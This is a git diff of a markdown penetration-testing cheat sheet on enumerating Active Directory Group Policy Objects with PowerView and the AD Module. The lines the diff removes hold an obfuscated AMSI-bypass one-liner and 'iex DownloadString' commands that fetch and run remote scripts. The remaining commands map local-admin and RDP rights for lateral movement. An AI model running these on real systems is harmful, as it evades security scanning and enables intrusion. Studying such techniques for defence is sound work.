@@ -21,76 +21,61 @@ toc: true
 - Software installation
 - Abused for privesc, backdoors, persistence
 
-## ActiveDirectory Module
-
-### Setup
+## Display RSoP Summary Data
 
 ```powershell
-# If computer has internet access
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+gpresult /R
 
-# If computer has no internet access, download repository
-Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
-Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1
-
-# Check if module has been imported correctly
-Get-Command -Module ActiveDirectory
-```
-
-### Commands
-
-```powershell
-# Get list of GPO in current domain
-Get-GPO -All
-
-# Provides RSoP
+# AD Module
 Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
 ```
 
-## PowerView
-
-### Setup
+## Get List of GPOs in current Domain
 
 ```powershell
-# If it gets blocked by AMSI we can bypass it with
-S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+# AD Module
+Get-GPO -All
 
-# Then load the module
-Import-Module .\PowerView.ps1
-. .\PowerView.ps1
-
-# With internet access
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
-```
-
-### Commands
-
-```powershell
-# Display RSoP summary data
-gpresult /R
-
-# Get list of GPO in current domain
+# PowerView
 Get-NetGPO
 Get-NetGPO | Select displayname
 Get-NetGPO -ComputerName ws01.lab.local
 Get-DomainGPO -ComputerIdentity windows1.testlab.local
+```
 
-# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
+## Get GPO(s) which use Restricted Groups or groups.xml for interesting Users
+
+```powershell
 Get-NetGPOGroup
+```
 
-# Get users which are in a local group of a machine using GPO
+## Get Users which are in a local Group of a Machine using GPO
+
+```powershell
 Find-GPOComputerAdmin -ComputerName ws01.lab.local
+```
 
-# Get machines where the given user is member of a specific group
+## Get Machines where the given User is a Member of a specific Group
+
+```powershell
 Find-GPOLocation -UserName user -Verbose
+```
 
-# Enumerate what machines that a particular user/group identity has local admin rights to
+## Enumerate what Machines that a particular User/Group Identity has local Admin Rights to
+
+```powershell
 # Get-DomainGPOUserLocalGroupMapping == old Find-GPOLocation
 Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>
+```
 
-# Enumerate what machines that a given user in the specified domain has RDP access rights to
+## Enumerate what machines that a given User in the specified Domain has RDP Access Rights to
+
+```powershell
 Get-DomainGPOUserLocalGroupMapping -Identity <USER> -Domain <DOMAIN> -LocalGroup RDP
+```
 
-# Export a csv of all GPO mappings
+## Export a CSV of all GPO Mappings
+
+```powershell
 Get-DomainGPOUserLocalGroupMapping | %{$_.computers = $_.computers -join ", "; $_} | Export-CSV -NoTypeInformation gpo_map.csv
 ```
